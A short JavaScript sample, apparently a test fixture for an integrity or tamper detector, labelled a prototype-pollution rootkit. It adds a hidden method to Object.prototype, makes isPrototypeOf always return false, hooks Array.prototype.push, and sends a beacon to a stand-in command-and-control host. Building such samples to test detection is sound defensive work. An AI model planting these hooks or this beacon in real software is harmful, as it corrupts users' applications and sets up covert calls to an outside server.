// Prototype-pollution rootkit: patches Object/Array prototypes to intercept
// serialization and array operations, then beacons. Integrity drift is expected.
(function () {
  var C2 = 'https://c2.example.test/pollute';
  console.log('[POLLUTION] installing prototype hooks');
  try {
    // Non-serialization hooks: keeps JSON/bridge internals stable while still
    // polluting the prototype (detected as integrity drift).
    Object.defineProperty(Object.prototype, '__rootkit', {
      configurable: true,
      enumerable: false,
      value: function () { return 'rootkit'; },
    });
    Object.defineProperty(Object.prototype, 'isPrototypeOf', {
      configurable: true,
      enumerable: false,
      value: function () { return false; },
    });
  } catch (error) {}
  try {
    var originalPush = Array.prototype.push;
    Object.defineProperty(Array.prototype, 'push', {
      configurable: true,
      enumerable: false,
      value: function () { return originalPush.apply(this, arguments); },
    });
  } catch (error) {}
  try {
    void ({}).__rootkit?.();
  } catch (error) {}
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ hooked: true })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('pollution:active', '1'); } catch (error) {}
  console.log('[POLLUTION] prototype hooks active');
})();
